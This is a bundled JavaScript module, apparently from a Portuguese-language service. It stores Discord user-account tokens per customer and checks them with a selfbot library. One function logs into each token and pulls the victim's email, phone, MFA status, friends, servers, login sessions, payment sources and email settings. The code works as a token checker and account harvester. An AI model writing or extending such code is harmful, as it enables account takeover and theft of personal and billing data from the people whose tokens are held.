import {
  prisma_default
} from "./chunk-MV7YXRMU.js";

// src/modules/monitoring/repository.ts
async function findAllMonitoringByUser(usuarioId) {
  return prisma_default.contas_monitoramento.findMany({
    where: { usuario_id: usuarioId },
    select: { id: true, is_valid: true, username: true, created_at: true, token: true }
  });
}
async function findMonitoringById(id, usuarioId) {
  return prisma_default.contas_monitoramento.findFirst({
    where: { id, usuario_id: usuarioId }
  });
}
async function createMonitoring(data) {
  return prisma_default.contas_monitoramento.create({ data });
}
async function deleteMonitoring(id, usuarioId) {
  return prisma_default.contas_monitoramento.deleteMany({
    where: { id, usuario_id: usuarioId }
  });
}
async function updateMonitoringValidity(id, is_valid) {
  return prisma_default.contas_monitoramento.update({ where: { id }, data: { is_valid } });
}
async function updateMonitoringUsername(id, username) {
  return prisma_default.contas_monitoramento.update({ where: { id }, data: { username } });
}
async function findAllValidTokens() {
  return prisma_default.contas_monitoramento.findMany({
    where: { is_valid: true },
    select: { id: true, token: true }
  });
}
async function countActiveMonitoring() {
  return prisma_default.contas_monitoramento.count({ where: { is_valid: true } });
}
async function findMonitoringTokenById(id) {
  return prisma_default.contas_monitoramento.findUnique({
    where: { id },
    select: { token: true }
  });
}

// src/selfbot/functions/validate-token.ts
import { Client } from "discord.js-selfbot-v13";
async function fetchWithToken(url, token) {
  try {
    const res = await fetch(url, { headers: { Authorization: token } });
    if (!res.ok) return null;
    return res.json();
  } catch {
    return null;
  }
}
async function validateToken(token) {
  const cleanToken = token.trim();
  if (cleanToken.startsWith("Bot ") || cleanToken.startsWith("Bearer ")) {
    return false;
  }
  const client = new Client({ checkUpdate: false, partials: ["MESSAGE", "CHANNEL", "USER"] });
  return new Promise((resolve) => {
    const timeout = setTimeout(() => {
      client.destroy();
      resolve(false);
    }, 15e3);
    client.on("ready", () => {
      clearTimeout(timeout);
      client.destroy();
      resolve(true);
    });
    client.on("error", () => {
      clearTimeout(timeout);
      client.destroy();
      resolve(false);
    });
    client.login(cleanToken).catch(() => {
      clearTimeout(timeout);
      client.destroy();
      resolve(false);
    });
  });
}
async function validateTokenAndGetUsername(token) {
  const cleanToken = token.trim();
  if (cleanToken.startsWith("Bot ") || cleanToken.startsWith("Bearer ")) {
    return { isValid: false };
  }
  const client = new Client({ checkUpdate: false, partials: ["MESSAGE", "CHANNEL", "USER"] });
  return new Promise((resolve) => {
    const timeout = setTimeout(() => {
      client.destroy();
      resolve({ isValid: false });
    }, 15e3);
    client.on("ready", () => {
      clearTimeout(timeout);
      const username = client.user?.username ?? "desconhecido";
      client.destroy();
      resolve({ isValid: true, username });
    });
    client.on("error", () => {
      clearTimeout(timeout);
      client.destroy();
      resolve({ isValid: false });
    });
    client.login(cleanToken).catch(() => {
      clearTimeout(timeout);
      client.destroy();
      resolve({ isValid: false });
    });
  });
}
async function validateTokenWithExtendedInfo(token) {
  const cleanToken = token.trim();
  if (cleanToken.startsWith("Bot ") || cleanToken.startsWith("Bearer ")) {
    return { valid: false };
  }
  const client = new Client({ checkUpdate: false, partials: ["MESSAGE", "CHANNEL", "USER"] });
  return new Promise((resolve) => {
    const timeout = setTimeout(() => {
      client.destroy();
      resolve({ valid: false });
    }, 15e3);
    client.on("ready", () => {
      clearTimeout(timeout);
      (async () => {
        const u = client.user;
        const guilds = [...client.guilds.cache.values()].map((g) => ({ id: g.id, name: g.name }));
        const relCache = client.relationships?.cache;
        const friends = [];
        if (relCache) {
          for (const [userId, relType] of relCache) {
            if (relType !== 1) continue;
            const u2 = client.users.cache.get(userId);
            friends.push({
              id: userId,
              username: u2?.username ?? "",
              global_name: u2?.globalName ?? null,
              avatar: u2?.avatar ?? null,
              discriminator: u2?.discriminator ?? "0"
            });
          }
        }
        const BASE = "https://discord.com/api/v9";
        const [sessionsRes, paymentSourcesRes, meExtendedRes, emailSettingsRes] = await Promise.all([
          fetchWithToken(`${BASE}/auth/sessions`, cleanToken),
          fetchWithToken(`${BASE}/users/@me/billing/payment-sources`, cleanToken),
          fetchWithToken(
            `${BASE}/users/@me`,
            cleanToken
          ),
          fetchWithToken(`${BASE}/users/@me/email-settings`, cleanToken)
        ]);
        const info = {
          id: u.id,
          username: u.username,
          discriminator: u.discriminator,
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          global_name: u.globalName ?? null,
          avatar: u.avatar,
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          email: u.email ?? null,
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          phone: u.phone ?? null,
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          mfa_enabled: u.mfaEnabled ?? false,
          guilds,
          guild_count: guilds.length,
          friends,
          friend_count: friends.length,
          bio: meExtendedRes?.bio ?? null,
          authenticator_types: meExtendedRes?.authenticator_types ?? [],
          age_verification_status: meExtendedRes?.age_verification_status ?? null,
          user_sessions: sessionsRes?.user_sessions ?? [],
          payment_sources: paymentSourcesRes ?? [],
          email_settings: emailSettingsRes ?? null
        };
        client.destroy();
        resolve({ valid: true, user: info });
      })().catch(() => {
        client.destroy();
        resolve({ valid: false });
      });
    });
    client.on("error", () => {
      clearTimeout(timeout);
      client.destroy();
      resolve({ valid: false });
    });
    client.login(cleanToken).catch(() => {
      clearTimeout(timeout);
      client.destroy();
      resolve({ valid: false });
    });
  });
}

export {
  findAllMonitoringByUser,
  findMonitoringById,
  createMonitoring,
  deleteMonitoring,
  updateMonitoringValidity,
  updateMonitoringUsername,
  findAllValidTokens,
  countActiveMonitoring,
  findMonitoringTokenById,
  validateToken,
  validateTokenAndGetUsername,
  validateTokenWithExtendedInfo
};
//# sourceMappingURL=chunk-A7PPCHXN.js.map